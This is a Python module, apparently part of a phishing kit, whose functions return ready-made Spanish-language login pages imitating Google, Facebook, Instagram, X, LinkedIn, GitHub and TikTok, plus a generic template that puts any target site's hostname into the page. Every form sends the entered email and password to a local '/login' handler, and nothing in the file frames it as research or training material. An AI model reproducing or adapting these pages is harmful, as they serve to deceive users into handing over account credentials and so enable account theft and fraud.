def para_personalizada(target_url):
    hostname = target_url.replace("https://", "").replace("http://", "").split("/")[0]
    return f"""<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Iniciar sesión - {hostname}</title>
<style>
*{{margin:0;padding:0;box-sizing:border-box}}
body{{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#f4f6f8;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}}
.container{{width:100%;max-width:420px;background:#fff;padding:40px 32px;border-radius:12px;box-shadow:0 1px 3px rgba(0,0,0,0.08),0 1px 2px rgba(0,0,0,0.06)}}
.header{{text-align:center;margin-bottom:32px}}
.header .domain{{font-size:14px;color:#6b7280;background:#f3f4f6;display:inline-block;padding:4px 12px;border-radius:4px;margin-bottom:16px}}
.header h1{{font-size:22px;font-weight:600;color:#111827}}
.header p{{color:#6b7280;font-size:14px;margin-top:4px}}
.form-group{{margin-bottom:20px}}
label{{display:block;font-size:13px;font-weight:600;color:#374151;margin-bottom:6px}}
input{{width:100%;padding:10px 12px;border:1px solid #d1d5db;border-radius:6px;font-size:15px;outline:none;background:#fff;color:#111827;transition:border-color 0.15s}}
input:focus{{border-color:#2563eb;box-shadow:0 0 0 3px rgba(37,99,235,0.1)}}
button{{width:100%;padding:10px 16px;background:#2563eb;color:#fff;border:none;border-radius:6px;font-size:15px;font-weight:500;cursor:pointer;transition:background 0.15s}}
button:hover{{background:#1d4ed8}}
.forgot{{display:block;text-align:center;margin-top:14px;color:#2563eb;text-decoration:none;font-size:13px;font-weight:500}}
.forgot:hover{{text-decoration:underline}}
.footer{{text-align:center;margin-top:24px;padding-top:20px;border-top:1px solid #e5e7eb;font-size:12px;color:#9ca3af}}
</style>
</head>
<body>
<div class="container">
<div class="header">
<div class="domain">{hostname}</div>
<h1>Iniciar sesión</h1>
<p>Ingresa tus credenciales para continuar</p>
</div>
<form method="POST" action="/login">
<div class="form-group">
<label>Correo electrónico o usuario</label>
<input type="text" name="email" required autocomplete="off">
</div>
<div class="form-group">
<label>Contrasena</label>
<input type="password" name="password" required autocomplete="off">
</div>
<button type="submit">Iniciar sesión</button>
<a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
</form>
<div class="footer">{hostname} - Acceso seguro</div>
</div>
</body>
</html>"""


def google():
    return """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Iniciar sesión: Cuentas de Google</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Google Sans','Roboto',Arial,sans-serif;background:#f0f4f9;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:24px}
.container{width:100%;max-width:450px;background:#fff;padding:48px 40px 36px;border-radius:28px;box-shadow:0 1px 2px 0 rgba(60,64,67,.3),0 2px 6px 2px rgba(60,64,67,.15)}
.logo{text-align:center;margin-bottom:16px}
.logo svg{width:75px;height:24px}
h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:4px;color:#202124}
.subtitle{text-align:center;color:#202124;font-size:16px;margin-bottom:32px}
.form-group{margin-bottom:16px}
input[type="text"],input[type="password"]{width:100%;padding:13px 15px;border:1px solid #dadce0;border-radius:4px;font-size:16px;outline:none;background:#fff;color:#202124}
input:focus{border-color:#1a73e8;border-width:2px;padding:12px 14px}
.forgot{font-size:14px;color:#1a73e8;text-decoration:none;margin-top:12px;display:inline-block;font-weight:500}
.info-text{font-size:14px;color:#5f6368;margin-top:32px;margin-bottom:24px;line-height:1.5}
.actions{display:flex;justify-content:space-between;align-items:center;margin-top:32px}
.create-account{font-size:14px;color:#1a73e8;text-decoration:none;font-weight:500}
button{background:#1a73e8;color:#fff;border:none;padding:10px 24px;border-radius:4px;font-size:14px;font-weight:500;cursor:pointer}
.footer{margin-top:48px;padding-top:24px;border-top:1px solid #dadce0;font-size:12px;color:#5f6368;text-align:center}
.footer a{color:#5f6368;text-decoration:none;margin:0 8px}
.step{display:none}
.step.active{display:block}
</style>
</head>
<body>
<div class="container">
<div class="logo">
<svg viewBox="0 0 75 24"><path fill="#4285f4" d="M0 19.5V4.5h3.5v15H0z"/><path fill="#ea4335" d="M14 19.5V4.5h3.5v15H14z"/><path fill="#fbbc04" d="M28 19.5V4.5h3.5v15H28z"/><path fill="#4285f4" d="M42 19.5V4.5h3.5v15H42z"/><path fill="#34a853" d="M56 19.5V4.5h3.5v15H56z"/><path fill="#ea4335" d="M70 19.5V4.5h3.5v15H70z"/></svg>
</div>
<form method="POST" action="/login" id="loginForm">
<div class="step active" id="step1">
<h1>Iniciar sesión</h1>
<p class="subtitle">Usa tu cuenta de Google</p>
<div class="form-group">
<input type="text" id="email" name="email" placeholder=" " required autocomplete="username">
</div>
<a href="#" class="forgot">¿Olvidaste tu correo?</a>
<p class="info-text">No es tu computadora? Usa el modo invitado.</p>
<div class="actions">
<a href="#" class="create-account">Crear cuenta</a>
<button type="button" id="nextBtn">Siguiente</button>
</div>
</div>
<div class="step" id="step2">
<h1>Bienvenido</h1>
<div style="text-align:center;margin-bottom:24px">
<div style="display:inline-flex;align-items:center;gap:8px;padding:8px 16px;border:1px solid #dadce0;border-radius:16px;font-size:14px">
<span id="displayEmail"></span>
</div>
</div>
<div class="form-group">
<input type="password" id="password" name="password" placeholder=" " autocomplete="current-password">
</div>
<a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
<div class="actions">
<a href="#" class="create-account" onclick="goBack();return false;">Atras</a>
<button type="submit">Siguiente</button>
</div>
</div>
</form>
<div class="footer"><a href="#">Ayuda</a><a href="#">Privacidad</a><a href="#">Condiciones</a></div>
</div>
<script>
var form=document.getElementById('loginForm'),s1=document.getElementById('step1'),s2=document.getElementById('step2'),
em=document.getElementById('email'),pw=document.getElementById('password'),nb=document.getElementById('nextBtn'),
de=document.getElementById('displayEmail');
nb.onclick=function(e){e.preventDefault();e.stopPropagation();
if(!em.value.trim())return false;
de.textContent=em.value;s1.classList.remove('active');s2.classList.add('active');setTimeout(function(){pw.focus()},100);
return false};
form.onsubmit=function(e){if(!s2.classList.contains('active')){e.preventDefault();nb.click();return false}
if(!pw.value){e.preventDefault();return false}};
function goBack(){s2.classList.remove('active');s1.classList.add('active');pw.value=''}
</script>
</body>
</html>"""


def facebook():
    return """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook - Iniciar sesión</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.container{display:flex;gap:80px;max-width:980px;width:100%;align-items:center}
.left{flex:1}
.logo{font-size:60px;font-weight:bold;color:#1877f2;margin-bottom:15px}
.tagline{font-size:28px;line-height:32px;color:#1c1e21}
.right{width:396px}
.card{background:#fff;padding:20px;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,0.1),0 8px 16px rgba(0,0,0,0.1)}
input{width:100%;padding:14px 16px;margin:6px 0;border:1px solid #dddfe2;border-radius:6px;font-size:17px}
input:focus{outline:none;border-color:#1877f2;box-shadow:0 0 0 2px #e7f3ff}
button{width:100%;padding:14px;background:#1877f2;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:bold;cursor:pointer;margin-top:10px}
.forgot{display:block;text-align:center;margin-top:16px;color:#1877f2;text-decoration:none;font-size:14px}
.divider{border-top:1px solid #dadde1;margin:20px 0}
.create{display:block;width:fit-content;margin:0 auto;padding:12px 20px;background:#42b72a;color:#fff;text-decoration:none;border-radius:6px;font-weight:bold;font-size:17px}
.footer{text-align:center;margin-top:28px;font-size:14px;color:#777}
@media(max-width:900px){.container{flex-direction:column;gap:20px}.left{text-align:center}.right{width:100%;max-width:396px}}
</style>
</head>
<body>
<div class="container">
<div class="left"><div class="logo">facebook</div><div class="tagline">Facebook te ayuda a comunicarte y compartir.</div></div>
<div class="right">
<div class="card">
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Correo o teléfono" required>
<input type="password" name="password" placeholder="Contrasena" required>
<button type="submit">Iniciar sesión</button>
</form>
<a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
<div class="divider"></div>
<a href="#" class="create">Crear cuenta nueva</a>
</div>
<div class="footer"><strong>Crea una pagina</strong> para una celebridad, marca o negocio.</div>
</div>
</div>
</body>
</html>"""


def instagram():
    return """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#fafafa;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{width:100%;max-width:350px}
.card{background:#fff;border:1px solid #dbdbdb;padding:40px 40px 20px;text-align:center;margin-bottom:10px}
.logo{font-size:48px;font-weight:500;margin-bottom:30px;background:linear-gradient(45deg,#f09433,#e6683c 25%,#dc2743 50%,#cc2366 75%,#bc1888 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent}
input{width:100%;padding:9px 8px 7px;margin:3px 0;border:1px solid #dbdbdb;border-radius:3px;font-size:12px;background:#fafafa}
button{width:100%;padding:7px 16px;background:#0095f6;color:#fff;border:none;border-radius:8px;font-weight:600;font-size:14px;cursor:pointer;margin-top:8px;opacity:.7}
button:hover{opacity:1}
.divider{display:flex;align-items:center;margin:18px 0}
.divider::before,.divider::after{content:'';flex:1;border-top:1px solid #dbdbdb}
.divider span{padding:0 18px;color:#8e8e8e;font-size:13px}
.forgot{display:block;margin-top:12px;color:#00376b;text-decoration:none;font-size:12px}
.signup{background:#fff;border:1px solid #dbdbdb;padding:22px 40px;text-align:center;font-size:14px}
.signup a{color:#0095f6;font-weight:600;text-decoration:none}
</style>
</head>
<body>
<div class="container">
<div class="card">
<div class="logo">Instagram</div>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Telefono, usuario o correo" required>
<input type="password" name="password" placeholder="Contrasena" required>
<button type="submit">Iniciar sesión</button>
</form>
<div class="divider"><span>O</span></div>
<a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
</div>
<div class="signup">No tienes una cuenta? <a href="#">Regístrate</a></div>
</div>
</body>
</html>"""


def twitter():
    return """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Iniciar sesión en X</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#000;color:#e7e9ea;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{width:100%;max-width:600px;padding:40px 80px}
.logo{font-size:64px;font-weight:900;margin-bottom:60px}
h1{font-size:64px;font-weight:800;margin-bottom:40px;line-height:1.1}
.btn-group{display:flex;flex-direction:column;gap:16px;margin-bottom:40px}
.btn{width:100%;padding:16px;border-radius:9999px;font-weight:700;font-size:17px;cursor:pointer;border:1px solid #536471;display:flex;align-items:center;justify-content:center;gap:12px;text-decoration:none}
.btn-google{background:#fff;color:#0f1419}
.btn-google:hover{background:#e7e9ea}
.divider{display:flex;align-items:center;margin:20px 0}
.divider::before,.divider::after{content:'';flex:1;border-top:1px solid #2f3336}
.divider span{padding:0 16px;color:#71767b;font-size:15px}
input{width:100%;padding:16px;margin:8px 0;border:1px solid #333639;border-radius:4px;font-size:17px;background:#000;color:#e7e9ea}
.btn-primary{width:100%;padding:16px;background:#e7e9ea;color:#0f1419;border:none;border-radius:9999px;font-weight:700;font-size:17px;cursor:pointer;margin-top:24px}
.forgot{display:block;margin-top:24px;color:#1d9bf0;text-decoration:none;font-size:15px}
.signup{margin-top:60px;font-size:17px}
.signup a{color:#1d9bf0;text-decoration:none;font-weight:700}
</style>
</head>
<body>
<div class="container">
<div class="logo">X</div>
<h1>Esta sucediendo<br>ahora</h1>
<div class="btn-group">
        <a href="/login/google" class="btn btn-google">Registrarse con Google</a>
</div>
<div class="divider"><span>o</span></div>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Telefono, correo o usuario" required>
<input type="password" name="password" placeholder="Contrasena" required>
<button type="submit" class="btn-primary">Iniciar sesión</button>
</form>
<a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
<div class="signup">No tienes cuenta? <a href="#">Regístrate</a></div>
</div>
</body>
</html>"""


def linkedin():
    return """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>LinkedIn: Inicia sesión</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,system-ui,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#f3f2ef;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:20px}
.container{width:100%;max-width:400px}
.logo{font-size:36px;font-weight:700;color:#0a66c2;margin-bottom:32px;display:flex;align-items:center;gap:4px}
.logo span{background:#0a66c2;color:#fff;padding:2px 8px;border-radius:4px;font-size:32px}
.card{background:#fff;padding:24px;border-radius:8px;box-shadow:0 4px 12px rgba(0,0,0,0.15)}
h1{font-size:32px;font-weight:600;margin-bottom:24px;color:rgba(0,0,0,0.9)}
label{display:block;font-size:14px;font-weight:600;margin-bottom:8px;color:rgba(0,0,0,0.6)}
input{width:100%;padding:12px 8px;border:1px solid rgba(0,0,0,0.6);border-radius:4px;font-size:16px;margin-bottom:16px}
input:focus{outline:none;border-color:#0a66c2}
.btn-primary{width:100%;padding:12px;background:#0a66c2;color:#fff;border:none;border-radius:24px;font-weight:600;font-size:16px;cursor:pointer;margin-top:16px}
.forgot{display:block;text-align:center;margin-top:16px;color:#0a66c2;text-decoration:none;font-size:14px;font-weight:600}
.signup{text-align:center;margin-top:24px;font-size:16px}
.signup a{color:#0a66c2;font-weight:600;text-decoration:none}
</style>
</head>
<body>
<div class="container">
<div class="logo">Linked<span>in</span></div>
<div class="card">
<h1>Iniciar sesión</h1>
<form method="POST" action="/login">
<label>Correo o teléfono</label>
<input type="text" name="email" required>
<label>Contrasena</label>
<input type="password" name="password" required>
<button type="submit" class="btn-primary">Iniciar sesión</button>
</form>
<div style="margin:16px 0;border-top:1px solid rgba(0,0,0,0.08);padding-top:16px">
<a href="/login/google" style="display:flex;align-items:center;justify-content:center;gap:8px;width:100%;padding:10px;border:1px solid rgba(0,0,0,0.6);border-radius:24px;color:rgba(0,0,0,0.6);text-decoration:none;font-weight:600;font-size:14px">
Continuar con Google</a>
</div>
<a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
</div>
<div class="signup">Nuevo en LinkedIn? <a href="#">Regístrate</a></div>
</div>
</body>
</html>"""


def github():
    return """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Iniciar sesión en GitHub</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI','Noto Sans',Helvetica,Arial,sans-serif;background:#0d1117;color:#f0f6fc;display:flex;flex-direction:column;align-items:center;min-height:100vh;padding:40px 16px}
.logo{margin-bottom:24px}
.logo svg{width:48px;height:48px;fill:#f0f6fc}
h1{font-size:24px;font-weight:300;margin-bottom:16px}
.card{width:100%;max-width:308px;background:#161b22;border:1px solid #30363d;border-radius:6px;padding:20px}
label{display:block;font-size:14px;font-weight:600;margin-bottom:8px}
input{width:100%;padding:5px 12px;border:1px solid #30363d;border-radius:6px;font-size:14px;background:#0d1117;color:#f0f6fc;margin-bottom:16px}
input:focus{outline:none;border-color:#1f6feb;box-shadow:0 0 0 3px rgba(31,111,235,0.3)}
button{width:100%;padding:5px 16px;background:#238636;color:#fff;border:1px solid rgba(240,246,252,0.1);border-radius:6px;font-weight:500;font-size:14px;cursor:pointer;line-height:20px}
.forgot{display:block;text-align:center;margin-top:16px;color:#2f81f7;text-decoration:none;font-size:12px}
.signup{text-align:center;margin-top:16px;font-size:14px}
.signup a{color:#2f81f7;text-decoration:none}
</style>
</head>
<body>
<div class="logo">
<svg viewBox="0 0 16 16"><path d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.013 8.013 0 0016 8c0-4.42-3.58-8-8-8z"></path></svg>
</div>
<h1>Iniciar sesión en GitHub</h1>
<div class="card">
<form method="POST" action="/login">
<label>Usuario o correo</label>
<input type="text" name="email" required>
<label>Contrasena</label>
<input type="password" name="password" required>
<button type="submit">Iniciar sesión</button>
</form>
<a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
</div>
<div class="signup">Nuevo en GitHub? <a href="#">Crea una cuenta</a></div>
</div>
</body>
</html>"""


def tiktok():
    return """<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>TikTok - Inicia sesión</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh}
.container{width:100%;max-width:480px;padding:40px 20px}
.header{text-align:center;margin-bottom:32px}
.logo{font-size:48px;font-weight:900;margin-bottom:16px}
.logo .tik{color:#25f4ee;text-shadow:2px 2px 0 #fe2c55}
.logo .tok{color:#fe2c55}
h1{font-size:32px;font-weight:700;color:#161823;margin-bottom:8px}
.card{background:#f8f8f8;border-radius:8px;padding:24px;margin-bottom:24px}
.btn-group{display:flex;flex-direction:column;gap:12px;margin-bottom:24px}
.btn{width:100%;padding:12px 16px;border-radius:4px;font-weight:600;font-size:16px;cursor:pointer;border:1px solid rgba(22,24,35,0.12);display:flex;align-items:center;justify-content:center;gap:8px;text-decoration:none;background:#fff;color:#161823}
.btn-facebook{background:#1877f2;color:#fff;border-color:#1877f2}
.btn-google{background:#fff}
.btn-twitter{background:#000;color:#fff;border-color:#000}
.divider{display:flex;align-items:center;margin:24px 0}
.divider::before,.divider::after{content:'';flex:1;border-top:1px solid rgba(22,24,35,0.12)}
.divider span{padding:0 16px;color:rgba(22,24,35,0.34);font-size:12px;text-transform:uppercase}
input{width:100%;padding:12px 16px;margin:6px 0;border:1px solid rgba(22,24,35,0.12);border-radius:4px;font-size:16px;background:#fff}
button.btn-primary{width:100%;padding:12px 16px;background:#fe2c55;color:#fff;border:none;border-radius:4px;font-weight:600;font-size:16px;cursor:pointer;margin-top:12px}
.forgot{display:block;text-align:center;margin-top:16px;color:#161823;text-decoration:none;font-size:14px;font-weight:600}
.signup{text-align:center;margin-top:24px;font-size:16px}
.signup a{color:#161823;text-decoration:none;font-weight:700}
</style>
</head>
<body>
<div class="container">
<div class="header">
<div class="logo"><span class="tik">Tik</span><span class="tok">Tok</span></div>
<h1>Inicia sesión en TikTok</h1>
</div>
<div class="card">
<div class="btn-group">
<a href="/login/facebook" class="btn btn-facebook">Continuar con Facebook</a>
<a href="/login/google" class="btn btn-google">Continuar con Google</a>
<a href="/login/twitter" class="btn btn-twitter">Continuar con X</a>
</div>
<div class="divider"><span>o</span></div>
<form method="POST" action="/login">
<input type="text" name="email" placeholder="Correo o usuario" required>
<input type="password" name="password" placeholder="Contrasena" required>
<button type="submit" class="btn-primary">Iniciar sesión</button>
</form>
<a href="#" class="forgot">¿Olvidaste tu contraseña?</a>
</div>
<div class="signup">No tienes cuenta? <a href="#">Regístrate</a></div>
</div>
</body>
</html>"""
